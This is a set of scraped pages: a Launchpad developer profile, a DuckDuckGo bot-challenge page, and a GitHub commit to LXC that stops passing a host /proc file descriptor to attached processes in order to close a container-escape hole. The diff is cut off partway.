[![Icon of Ubuntu Sponsors](https://launchpadlibrarian.net/40794090/minitools.png "Member of Ubuntu Sponsors")](/~ubuntu-sponsors)
[![Icon of Ubuntu Studio Development](https://launchpadlibrarian.net/479050820/14.png "Member of Ubuntu Studio Development")](/~ubuntustudio-dev)
[![Icon of Xubuntu Artwork](https://launchpadlibrarian.net/341831649/icon_optimized_14.png "Member of Xubuntu Artwork")](/~xubuntu-art)
[![Icon of Xubuntu Developers](https://launchpadlibrarian.net/139019912/x-dev.png "Member of Xubuntu Developers")](/~xubuntu-dev)

Signed Ubuntu Code of Conduct:
Yes

Languages:

English, French

OpenPGP keys:

602F567663E593BCBD14F338C638974D64792D67

SSH keys:

[cardno:000611576019](%2Bsshkeys)

Time zone:

America/Montreal
(UTC-0500)

Karma:
[256](https://launchpad.net/~stgraber/%2Bkarma)
[Karma help](/%2Bhelp-registry/karma.html)

Social accounts:
![IRC](/@@/social-irc "IRC")
**stgraber**
 on
**libera.chat**

![IRC](/@@/social-irc "IRC")
**stgraber**
 on
**oftc.net**

## [All bugs in progress](https://launchpad.net/~stgraber/%2Bassignedbugs?search=Search&field.status=In+Progress) Assigned bugs

||  | #1959993 [SRU of LXC 4.0.12 to focal (upstream bugfix release)](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1959993) |  |
| --- | --- | --- |
| in [Ubuntu](/ubuntu) | | |

| --- | --- | --- | --- | --- | --- |

## [All assigned blueprints](/~stgraber/%2Bspecs?role=assignee) Assigned blueprints

| **[Networking improvements for Quantal (IPv6, DNS, Network Manager)](https://blueprints.launchpad.net/ubuntu/%2Bspec/foundations-q-networking "foundations-q-networking")** for **Ubuntu**  Catch all session (should be scheduled in a big slot if possible) for networking in Quantal. Discussing with Mathieu Trudel, we don't think there's enough to discuss this time around to warrant the usual 2-3 networking related sessions. If we're wrong, then we'll schedule another one. | |
| --- | --- |
| **[Generate a preseed file during Ubuntu installation](https://blueprints.launchpad.net/ubuntu/%2Bspec/foundations-q-autocreate-preseed "foundations-q-autocreate-preseed")** for **Ubuntu**  Customers are trying to place Ubuntu in their PXE environments for hands free automated installation, but they may not want to integrate MaaS in their current server dev (non-cloud) environment. To ease Ubuntu integration we should generate the preseed file during the manual install process so the user has the abil... | |
| **[Improvements to the ISO tracker and some build related scripts](https://blueprints.launchpad.net/ubuntu/%2Bspec/foundations-q-iso-tracker "foundations-q-iso-tracker")** for **Ubuntu**  Discussion of changes that would help: - release team with managing and publishing images, understanding the quality/shipability - qa teams (ubuntu and flavors) for understanding quality of images and issues for developers - testers ease of using system, logging results, automated logging, knowing bugs | |
| **[Future of Arkose and application sandboxing for Precise](https://blueprints.launchpad.net/ubuntu/%2Bspec/foundations-p-arkose "foundations-p-arkose")** for **Ubuntu**  Arkose has been entirely rewritten over the past 6 months and a lot of new features have been implemented. During this session, I'd like to talk about the next set of improvements for Arkose and where it can and should be integrated with the distro. Amongst changes I think are worth discussing in this session are: ... | |
| **[ISO/QA testing tracker improvements for Precise](https://blueprints.launchpad.net/ubuntu/%2Bspec/foundations-p-iso-tracker "foundations-p-iso-tracker")** for **Ubuntu**  The QA tracker at http://iso.qa.ubuntu.com has been around for quite a while now. It's in desperate need of some small changes to better work with the amount of testing Ubuntu requires nowadays. This session is meant to discuss what are the most important changes we need to make the tracker work better for the LTS.... | |

## Personal package archives

| [Stéphane Graber - build area](/~stgraber/%2Barchive/ubuntu/experimental) |
| --- |
| [Stéphane Graber - build area (devirtualized)](/~stgraber/%2Barchive/ubuntu/experimental-devirt) |
| [Stéphane Graber - OVN stable](/~stgraber/%2Barchive/ubuntu/ovn-stable) |
| [Stéphane Graber - stgraber.net](/~stgraber/%2Barchive/ubuntu/stgraber.net) |
| [Stéphane Graber - build area (backports enabled)](/~stgraber/%2Barchive/ubuntu/with-backports) |

## [All memberships](https://launchpad.net/~stgraber/%2Bparticipation) Latest memberships

| [cowsql](/~cowsql)  Joined on 2023-08-15 | |
| --- | --- |
| [Not Canonical](/~not-canonical)  Joined on 2023-07-09 | |
| [Ubuntu LXC Security team](/~ubuntu-lxc-security)  Joined on 2016-05-26 | |
| [Ubuntu LXC team](/~ubuntu-lxc)  Joined on 2011-07-22 | |

## [Recent activities](https://launchpad.net/~stgraber/%2Bkarma) Most active in

| [Ubuntu](/ubuntu) |  |  |
| --- | --- | --- |

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from duckduckgo.com_01d5e082_20250126_010315.html ===


[DuckDuckGo](/html/)

Unfortunately, bots use DuckDuckGo too.
Please complete the following challenge to confirm this search was made by a human.
Select all squares containing a duck:

![ ](../assets/anomaly/images/challenge/d3840fd63a674ceb9c80e2436f941562.jpg)

![ ](../assets/anomaly/images/challenge/f47662818bba4f8ba9905f6b7fb7aa70.jpg)

![ ](../assets/anomaly/images/challenge/ffd9b913214744bf9a9147758a589934.jpg)

![ ](../assets/anomaly/images/challenge/4855a01208d54730bec25256c4e934a8.jpg)

![ ](../assets/anomaly/images/challenge/ce29e817249f4d1f8d3dbdf3c97f73a3.jpg)

![ ](../assets/anomaly/images/challenge/dc71c97d6c254a33bd7f3546d393bd53.jpg)

![ ](../assets/anomaly/images/challenge/7214b7e37ba3470a80a60db40c289c0e.jpg)

![ ](../assets/anomaly/images/challenge/fb2fad6b1c4f4b7587a3201c6aec817f.jpg)

![ ](../assets/anomaly/images/challenge/970279f153b048b0a2828c7793fd54b0.jpg)

Submit
Images not loading?
Please email the following code to:

error-lite@duckduckgo.com

Code: d4cd0dabcf4caa22ad92fab40844c786

![](//duckduckgo.com/t/tqadb?5639569&s=lite&iadb=0&c=dadb&i=-1&o=QhUuc2%2F751PohjwKqWTq9r6kFOVApSzFWExq0y5YL%2B1qqYI%2BstQ4Bunm1NwhfV4p%0A&r=eun&e=0&p=d3840fd63a674ceb9c80e2436f941562-f47662818bba4f8ba9905f6b7fb7aa70-ffd9b913214744bf9a9147758a589934-4855a01208d54730bec25256c4e934a8-ce29e817249f4d1f8d3dbdf3c97f73a3-dc71c97d6c254a33bd7f3546d393bd53-7214b7e37ba3470a80a60db40c289c0e-fb2fad6b1c4f4b7587a3201c6aec817f-970279f153b048b0a2828c7793fd54b0&gk=d4cd0dabcf4caa22ad92fab40844c786&sc=1&cc=botnet)


=== Content from github.com_29fdd7e6_20250126_010324.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flxc%2Flxc%2Fcommit%2F81f466d05f2a89cb4f122ef7f593ff3f279b165c)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flxc%2Flxc%2Fcommit%2F81f466d05f2a89cb4f122ef7f593ff3f279b165c)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=lxc%2Flxc)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[lxc](/lxc)
/
**[lxc](/lxc/lxc)**
Public

* [Notifications](/login?return_to=%2Flxc%2Flxc) You must be signed in to change notification settings
* [Fork
  1.1k](/login?return_to=%2Flxc%2Flxc)
* [Star
   4.8k](/login?return_to=%2Flxc%2Flxc)

* [Code](/lxc/lxc)
* [Issues
  171](/lxc/lxc/issues)
* [Pull requests
  6](/lxc/lxc/pulls)
* [Actions](/lxc/lxc/actions)
* [Security](/lxc/lxc/security)
* [Insights](/lxc/lxc/pulse)

Additional navigation options

* [Code](/lxc/lxc)
* [Issues](/lxc/lxc/issues)
* [Pull requests](/lxc/lxc/pulls)
* [Actions](/lxc/lxc/actions)
* [Security](/lxc/lxc/security)
* [Insights](/lxc/lxc/pulse)

## Commit

[Permalink](/lxc/lxc/commit/81f466d05f2a89cb4f122ef7f593ff3f279b165c)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

attach: do not send procfd to attached process

[Browse files](/lxc/lxc/tree/81f466d05f2a89cb4f122ef7f593ff3f279b165c)
Browse the repository at this point in the history

```
So far, we opened a file descriptor refering to proc on the host inside the
host namespace and handed that fd to the attached process in
attach_child_main(). This was done to ensure that LSM labels were correctly
setup. However, by exploiting a potential kernel bug, ptrace could be used to
prevent the file descriptor from being closed which in turn could be used by an
unprivileged container to gain access to the host namespace. Aside from this
needing an upstream kernel fix, we should make sure that we don't pass the fd
for proc itself to the attached process. However, we cannot completely prevent
this, as the attached process needs to be able to change its apparmor profile
by writing to /proc/self/attr/exec or /proc/self/attr/current. To minimize the
attack surface, we only send the fd for /proc/self/attr/exec or
/proc/self/attr/current to the attached process. To do this we introduce a
little more IPC between the child and parent:

	 * IPC mechanism: (X is receiver)
	 *   initial process        intermediate          attached
	 *        X           <---  send pid of
	 *                          attached proc,
	 *                          then exit
	 *    send 0 ------------------------------------>    X
	 *                                              [do initialization]
	 *        X  <------------------------------------  send 1
	 *   [add to cgroup, ...]
	 *    send 2 ------------------------------------>    X
	 *						[set LXC_ATTACH_NO_NEW_PRIVS]
	 *        X  <------------------------------------  send 3
	 *   [open LSM label fd]
	 *    send 4 ------------------------------------>    X
	 *   						[set LSM label]
	 *   close socket                                 close socket
	 *                                                run program

The attached child tells the parent when it is ready to have its LSM labels set
up. The parent then opens an approriate fd for the child PID to
/proc/<pid>/attr/exec or /proc/<pid>/attr/current and sends it via SCM_RIGHTS
to the child. The child can then set its LSM laben. Both sides then close the
socket fds and the child execs the requested process.

Signed-off-by: Christian Brauner <christian.brauner@canonical.com>
```

* Loading branch information

[![@stgraber](https://avatars.githubusercontent.com/u/2230599?s=40&v=4)](/stgraber)

Christian Brauner
authored and
[stgraber](/lxc/lxc/commits?author=stgraber "View all commits by stgraber")
committed
Nov 23, 2016

1 parent
[8f227cd](/lxc/lxc/commit/8f227cdcb8cee6895e3c9f204b0a72c3d943a74d)

commit 81f466d

Showing
**1 changed file**
with
**134 additions**
and
**50 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

184 changes: 134 additions & 50 deletions

184
[src/lxc/attach.c](#diff-89ae89e4486c98c3dee03acd7d71814dad679cd1ba295ca1c99060da4384fe0c "src/lxc/attach.c")

Show comments

[View file](/lxc/lxc/blob/81f466d05f2a89cb4f122ef7f593ff3f279b165c/src/lxc/attach.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -53,6 +53,7 @@ |
|  |  |  |
|  |  | #include "namespace.h" |
|  |  | #include "log.h" |
|  |  | #include "af\_unix.h" |
|  |  | #include "attach.h" |
|  |  | #include "caps.h" |
|  |  | #include "config.h" |
| Expand Down  Expand Up | | @@ -84,80 +85,103 @@ |
|  |  |  |
|  |  | lxc\_log\_define(lxc\_attach, lxc); |
|  |  |  |
|  |  | int lsm\_set\_label\_at(int procfd, int on\_exec, char\* lsm\_label) { |
|  |  | static int lsm\_openat(int procfd, pid\_t pid, int on\_exec) |
|  |  | { |
|  |  | int ret = -1; |
|  |  | int labelfd = -1; |
|  |  | int ret = 0; |
|  |  | const char\* name; |
|  |  | char\* command = NULL; |
|  |  | #define \_\_LSMATTRLEN /\* /proc \*/ (5 + /\* /pid-to-str \*/ 21 + /\* /current \*/ 7 + /\* \0 \*/ 1) |
|  |  | char path[\_\_LSMATTRLEN]; |
|  |  |  |
|  |  | name = lsm\_name(); |
|  |  |  |
|  |  | if (strcmp(name, "nop") == 0) |
|  |  | goto out; |
|  |  | return 0; |
|  |  |  |
|  |  | if (strcmp(name, "none") == 0) |
|  |  | goto out; |
|  |  | return 0; |
|  |  |  |
|  |  | /\* We don't support on-exec with AppArmor \*/ |
|  |  | if (strcmp(name, "AppArmor") == 0) |
|  |  | on\_exec = 0; |
|  |  |  |
|  |  | if (on\_exec) { |
|  |  | labelfd = openat(procfd, "self/attr/exec", O\_RDWR); |
|  |  | } |
|  |  | else { |
|  |  | labelfd = openat(procfd, "self/attr/current", O\_RDWR); |
|  |  | ret = snprintf(path, \_\_LSMATTRLEN, "%d/attr/exec", pid); |
|  |  | if (ret < 0 || ret >= \_\_LSMATTRLEN) |
|  |  | return -1; |
|  |  | labelfd = openat(procfd, path, O\_RDWR); |
|  |  | } else { |
|  |  | ret = snprintf(path, \_\_LSMATTRLEN, "%d/attr/current", pid); |
|  |  | if (ret < 0 || ret >= \_\_LSMATTRLEN) |
|  |  | return -1; |
|  |  | labelfd = openat(procfd, path, O\_RDWR); |
|  |  | } |
|  |  |  |
|  |  | if (labelfd < 0) { |
|  |  | SYSERROR("Unable to open LSM label"); |
|  |  | ret = -1; |
|  |  | goto out; |
|  |  | return -1; |
|  |  | } |
|  |  |  |
|  |  | return labelfd; |
|  |  | } |
|  |  |  |
|  |  | static int lsm\_set\_label\_at(int lsm\_labelfd, int on\_exec, char \*lsm\_label) |
|  |  | { |
|  |  | int fret = -1; |
|  |  | const char\* name; |
|  |  | char \*command = NULL; |
|  |  |  |
|  |  | name = lsm\_name(); |
|  |  |  |
|  |  | if (strcmp(name, "nop") == 0) |
|  |  | return 0; |
|  |  |  |
|  |  | if (strcmp(name, "none") == 0) |
|  |  | return 0; |
|  |  |  |
|  |  | /\* We don't support on-exec with AppArmor \*/ |
|  |  | if (strcmp(name, "AppArmor") == 0) |
|  |  | on\_exec = 0; |
|  |  |  |
|  |  | if (strcmp(name, "AppArmor") == 0) { |
|  |  | int size; |
|  |  |  |
|  |  | command = malloc(strlen(lsm\_label) + strlen("changeprofile ") + 1); |
|  |  | if (!command) { |
|  |  | SYSERROR("Failed to write apparmor profile"); |
|  |  | ret = -1; |
|  |  | goto out; |
|  |  | } |
|  |  |  |
|  |  | size = sprintf(command, "changeprofile %s", lsm\_label); |
|  |  | if (size < 0) { |
|  |  | SYSERROR("Failed to write apparmor profile"); |
|  |  | ret = -1; |
|  |  | goto out; |
|  |  | } |
|  |  |  |
|  |  | if (write(labelfd, command, size + 1) < 0) { |
|  |  | SYSERROR("Unable to set LSM label"); |
|  |  | ret = -1; |
|  |  | if (write(lsm\_labelfd, command, size + 1) < 0) { |
|  |  | SYSERROR("Unable to set LSM label: %s.", command); |
|  |  | goto out; |
|  |  | } |
|  |  | } |
|  |  | else if (strcmp(name, "SELinux") == 0) { |
|  |  | if (write(labelfd, lsm\_label, strlen(lsm\_label) + 1) < 0) { |
|  |  | INFO("Set LSM label to: %s.", command); |
|  |  | } else if (strcmp(name, "SELinux") == 0) { |
|  |  | if (write(lsm\_labelfd, lsm\_label, strlen(lsm\_label) + 1) < 0) { |
|  |  | SYSERROR("Unable to set LSM label"); |
|  |  | ret = -1; |
|  |  | goto out; |
|  |  | } |
|  |  | } |
|  |  | else { |
|  |  | INFO("Set LSM label to: %s.", lsm\_label); |
|  |  | } else { |
|  |  | ERROR("Unable to restore label for unknown LSM: %s", name); |
|  |  | ret = -1; |
|  |  | goto out; |
|  |  | } |
|  |  | fret = 0; |
|  |  |  |
|  |  | out: |
|  |  | free(command); |
|  |  |  |
|  |  | if (labelfd != -1) |
|  |  | close(labelfd); |
|  |  | if (lsm\_labelfd != -1) |
|  |  | close(lsm\_labelfd); |
|  |  |  |
|  |  | return ret; |
|  |  | return fret; |
|  |  | } |
|  |  |  |
|  |  | static struct lxc\_proc\_context\_info \*lxc\_proc\_get\_context\_info(pid\_t pid) |
| Expand Down  Expand Up | | @@ -646,7 +670,6 @@ struct attach\_clone\_payload { |
|  |  | struct lxc\_proc\_context\_info\* init\_ctx; |
|  |  | lxc\_attach\_exec\_t exec\_function; |
|  |  | void\* exec\_payload; |
|  |  | int procfd; |
|  |  | }; |
|  |  |  |
|  |  | static int attach\_child\_main(void\* data); |
| Expand Down  Expand Up | | @@ -744,7 +767,6 @@ int lxc\_attach(const char\* name, const char\* lxcpath, lxc\_attach\_exec\_t exec\_fun |
|  |  | char\* cwd; |
|  |  | char\* new\_cwd; |
|  |  | int ipc\_sockets[2]; |
|  |  | int procfd; |
|  |  | signed long personality; |
|  |  |  |
|  |  | if (!options) |
| Expand Down  Expand Up | | @@ -821,6 +843,11 @@ int lxc\_attach(const char\* name, const char\* lxcpath, lxc\_attach\_exec\_t exec\_fun |
|  |  | \* X <------------------------------------ send 1 |
|  |  | \* [add to cgroup, ...] |
|  |  | \* send 2 ------------------------------------> X |
|  |  | \* [set LXC\_ATTACH\_NO\_NEW\_PRIVS] |
|  |  | \* X <------------------------------------ send 3 |
|  |  | \* [open LSM label fd] |
|  |  | \* send 4 ------------------------------------> X |
|  |  | \* [set LSM label] |
|  |  | \* close socket close socket |
|  |  | \* run program |
|  |  | \*/ |
| Expand Down  Expand Up | | @@ -854,6 +881,7 @@ int lxc\_attach(const char\* name, const char\* lxcpath, lxc\_attach\_exec\_t exec\_fun |
|  |  | } |
|  |  |  |
|  |  | if (pid) { |
|  |  | int procfd = -1; |
|  |  | pid\_t to\_cleanup\_pid = pid; |
|  |  |  |
|  |  | /\* initial thread, we close the socket that is for the |
| Expand All | | @@ -868,6 +896,15 @@ int lxc\_attach(const char\* name, const char\* lxcpath, lxc\_attach\_exec\_t exec\_fun |
|  |  | goto cleanup\_error; |
|  |  | } |
|  |  |  |
|  |  | /\* Open /proc before setns() to the containers namespace so we |
|  |  | \* don't rely on any information from inside the container. |
|  |  | \*/ |
|  |  | procfd = open("/proc", O\_DIRECTORY | O\_RDONLY | O\_CLOEXEC); |
|  |  | if (procfd < 0) { |
|  |  | SYSERROR("Unable to open /proc."); |
|  |  | goto cleanup\_error; |
|  |  | } |
|  |  |  |
|  |  | /\* Let the child process know to go ahead \*/ |
|  |  | status = 0; |
|  |  | ret = lxc\_write\_nointr(ipc\_sockets[0], &status, sizeof(status)); |
| Expand Down  Expand Up | | @@ -911,18 +948,49 @@ int lxc\_attach(const char\* name, const char\* lxcpath, lxc\_attach\_exec\_t exec\_fun |
|  |  | ret = lxc\_read\_nointr\_expect(ipc\_sockets[0], &status, sizeof(status), &expected); |
|  |  | if (ret <= 0) { |
|  |  | if (ret != 0) |
|  |  | ERROR("error using IPC to receive notification from attached process (1)"); |
|  |  | ERROR("error using IPC to receive notification " |
|  |  | "from attached process (1)"); |
|  |  | goto cleanup\_error; |
|  |  | } |
|  |  |  |
|  |  | /\* tell attached process we're done \*/ |
|  |  | status = 2; |
|  |  | ret = lxc\_write\_nointr(ipc\_sockets[0], &status, sizeof(status)); |
|  |  | if (ret <= 0) { |
|  |  | ERROR("error using IPC to notify attached process for initialization (2)"); |
|  |  | ERROR("Error using IPC to notify attached process for " |
|  |  | "initialization (2): %s.", strerror(errno)); |
|  |  | goto cleanup\_error; |
|  |  | } |
|  |  |  |
|  |  | /\* Wait for the (grand)child to tell us that it's ready to set |
|  |  | \* up its LSM labels. |
|  |  | \*/ |
|  |  | expected = 3; |
|  |  | ret = lxc\_read\_nointr\_expect(ipc\_sockets[0], &status, sizeof(status), &expected); |
|  |  | if (ret <= 0) { |
|  |  | ERROR("Error using IPC for the child to tell us to open LSM fd (3): %s.", |
|  |  | strerror(errno)); |
|  |  | goto cleanup\_error; |
|  |  | } |
|  |  |  |
|  |  | /\* Open LSM fd and send it to child. \*/ |
|  |  | if ((options->namespaces & CLONE\_NEWNS) && (options->attach\_flags & LXC\_ATTACH\_LSM) && init\_ctx->lsm\_label) { |
|  |  | int on\_exec, labelfd; |
|  |  | on\_exec = options->attach\_flags & LXC\_ATTACH\_LSM\_EXEC ? 1 : 0; |
|  |  | /\* Open fd for the LSM security module. \*/ |
|  |  | labelfd = lsm\_openat(procfd, attached\_pid, on\_exec); |
|  |  | if (labelfd < 0) |
|  |  | goto cleanup\_error; |
|  |  |  |
|  |  | /\* Send child fd of the LSM security module to write to. \*/ |
|  |  | ret = lxc\_abstract\_unix\_send\_fd(ipc\_sockets[0], labelfd, NULL, 0); |
|  |  | if (ret <= 0) { |
|  |  | ERROR("Error using IPC to send child LSM fd (4): %s.", |
|  |  | strerror(errno)); |
|  |  | goto cleanup\_error; |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | /\* now shut down communication with child, we're done \*/ |
|  |  | shutdown(ipc\_sockets[0], SHUT\_RDWR); |
|  |  | close(ipc\_sockets[0]); |
| Expand All | | @@ -940,6 +1008,8 @@ int lxc\_attach(const char\* name, const char\* lxcpath, lxc\_attach\_exec\_t exec\_fun |
|  |  | /\* first shut down the socket, then wait for the pid, |
|  |  | \* otherwise the pid we're waiting for may never exit |
|  |  | \*/ |
|  |  | if (procfd >= 0) |
|  |  | close(procfd); |
|  |  | shutdown(ipc\_sockets[0], SHUT\_RDWR); |
|  |  | close(ipc\_sockets[0]); |
|  |  | if (to\_cleanup\_pid) |
| Expand All | | @@ -966,13 +1036,6 @@ int lxc\_attach(const char\* name, const char\* lxcpath, lxc\_attach\_exec\_t exec\_fun |
|  |  | if ((options->attach\_flags & LXC\_ATTACH\_MOVE\_TO\_CGROUP) && cgns\_supported()) |
|  |  | options->namespaces |= CLONE\_NEWCGROUP; |
|  |  |  |
|  |  | procfd = open("/proc", O\_DIRECTORY | O\_RDONLY); |
|  |  | if (procfd < 0) { |
|  |  | SYSERROR("Unable to open /proc"); |
|  |  | shutdown(ipc\_sockets[1], SHUT\_RDWR); |
|  |  | rexit(-1); |
|  |  | } |
|  |  |  |
|  |  | /\* attach now, create another subprocess later, since pid namespaces |
|  |  | \* only really affect the children of the current process |
|  |  | \*/ |
| Expand Down  Expand Up | | @@ -1001,7 +1064,6 @@ int lxc\_attach(const char\* name, const char\* lxcpath, lxc\_attach\_exec\_t exec\_fun |
|  |  | .init\_ctx = init\_ctx, |
|  |  | .exec\_function = exec\_function, |
|  |  | .exec\_payload = exec\_payload, |
|  |  | .procfd = procfd |
|  |  | }; |
|  |  | /\* We use clone\_parent here to make this subprocess a direct child of |
|  |  | \* the initial process. Then this intermediate process can exit and |
| Expand Down  Expand Up | | @@ -1039,7 +1101,6 @@ static int attach\_child\_main(void\* data) |
|  |  | { |
|  |  | struct attach\_clone\_payload\* payload = (struct attach\_clone\_payload\*)data; |
|  |  | int ipc\_socket = payload->ipc\_socket; |
|  |  | int procfd = payload->procfd; |
|  |  | lxc\_attach\_options\_t\* options = payload->options; |
|  |  | struct lxc\_proc\_context\_info\* init\_ctx = payload->init\_ctx; |
|  |  | #if HAVE\_SYS\_PERSONALITY\_H |
| Expand All | | @@ -1050,6 +1111,7 @@ static int attach\_child\_main(void\* data) |
|  |  | int expected; |
|  |  | long flags; |
|  |  | int fd; |
|  |  | int lsm\_labelfd; |
|  |  | uid\_t new\_uid; |
|  |  | gid\_t new\_gid; |
|  |  |  |
| Expand All | | @@ -1060,7 +1122,7 @@ static int attach\_child\_main(void\* data) |
|  |  | status = -1; |
|  |  | ret = lxc\_read\_nointr\_expect(ipc\_socket, &status, sizeof(status), &expected); |
|  |  | if (ret <= 0) { |
|  |  | ERROR("error using IPC to receive notification from initial process (0)"); |
|  |  | ERROR("Error using IPC to receive notification from initial process (0): %s.", strerror(errno)); |
|  |  | shutdown(ipc\_socket, SHUT\_RDWR); |
|  |  | rexit(-1); |
|  |  | } |
| Expand Down  Expand Up | | @@ -1159,7 +1221,7 @@ static int attach\_child\_main(void\* data) |
|  |  | status = 1; |
|  |  | ret = lxc\_write\_nointr(ipc\_socket, &status, sizeof(status)); |
|  |  | if (ret != sizeof(status)) { |
|  |  | ERROR("error using IPC to notify initial process for initialization (1)"); |
|  |  | ERROR("Error using IPC to notify initial process for initialization (1): %s.", strerror(errno)); |
|  |  | shutdown(ipc\_socket, SHUT\_RDWR); |
|  |  | rexit(-1); |
|  |  | } |
| Expand All | | @@ -1171,42 +1233,67 @@ static int attach\_child\_main(void\* data) |
|  |  | status = -1; |
|  |  | ret = lxc\_read\_nointr\_expect(ipc\_socket, &status, sizeof(status), &expected); |
|  |  | if (ret <= 0) { |
|  |  | ERROR("error using IPC to receive final notification from initial process (2)"); |
|  |  | ERROR("Error using IPC to receive message from initial process " |
|  |  | "that it is done pre-initializing (2): %s", |
|  |  | strerror(errno)); |
|  |  | shutdown(ipc\_socket, SHUT\_RDWR); |
|  |  | rexit(-1); |
|  |  | } |
|  |  |  |
|  |  | shutdown(ipc\_socket, SHUT\_RDWR); |
|  |  | close(ipc\_socket); |
|  |  |  |
|  |  | if ((init\_ctx->container && init\_ctx->container->lxc\_conf && |
|  |  | init\_ctx->container->lxc\_conf->no\_new\_privs) || |
|  |  | (options->attach\_flags & LXC\_ATTACH\_NO\_NEW\_PRIVS)) { |
|  |  | if (prctl(PR\_SET\_NO\_NEW\_PRIVS, 1, 0, 0, 0) < 0) { |
|  |  | SYSERROR("PR\_SET\_NO\_NEW\_PRIVS could not be set. " |
|  |  | "Process can use execve() gainable " |
|  |  | "privileges."); |
|  |  | shutdown(ipc\_socket, SHUT\_RDWR); |
|  |  | rexit(-1); |
|  |  | } |
|  |  | INFO("PR\_SET\_NO\_NEW\_PRIVS is set. Process cannot use execve() " |
|  |  | "gainable privileges."); |
|  |  | } |
|  |  |  |
|  |  | /\* set new apparmor profile/selinux context \*/ |
|  |  | /\* Tell the (grand)parent to send us LSM label fd. \*/ |
|  |  | status = 3; |
|  |  | ret = lxc\_write\_nointr(ipc\_socket, &status, sizeof(status)); |
|  |  | if (ret <= 0) { |
|  |  | ERROR("Error using IPC to tell parent to set up LSM labels (3): %s.", strerror(errno)); |
|  |  | shutdown(ipc\_socket, SHUT\_RDWR); |
|  |  | rexit(-1); |
|  |  | } |
|  |  |  |
|  |  | if ((options->namespaces & CLONE\_NEWNS) && (options->attach\_flags & LXC\_ATTACH\_LSM) && init\_ctx->lsm\_label) { |
|  |  | int on\_exec; |
|  |  | /\* Receive fd for LSM security module. \*/ |
|  |  | ret = lxc\_abstract\_unix\_recv\_fd(ipc\_socket, &lsm\_labelfd, NULL, 0); |
|  |  | if (ret <= 0) { |
|  |  | ERROR("Error using IPC for parent to tell us LSM label fd (4): %s.", strerror(errno)); |
|  |  | shutdown(ipc\_socket, SHUT\_RDWR); |
|  |  | rexit(-1); |
|  |  | } |
|  |  |  |
|  |  | /\* Change into our new LSM profile. \*/ |
